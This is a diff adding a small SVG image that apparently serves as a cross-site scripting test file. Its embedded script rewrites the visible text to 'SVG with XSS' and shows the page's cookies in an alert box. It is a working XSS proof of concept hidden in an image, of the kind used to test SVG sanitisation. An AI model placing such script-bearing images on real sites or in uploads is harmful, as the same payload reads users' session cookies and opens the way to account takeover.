@@ -1,0 +1,11 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="260" height="45">
+	<text x="5" y="35" font-family="Verdana" font-size="35" id="uid_my-uid_acc-vids">
+		Regular SVG
+	</text>
+	<script>
+		document.getElementById('uid_my-uid_acc-vids').innerHTML = 'SVG with XSS';
+  		setTimeout(function(){
+			alert('XSS:\n'+(document.cookie?document.cookie.replace(/; ?/g, '\n'):'no cookies'));
+		}, 50);
+	</script>
+</svg>
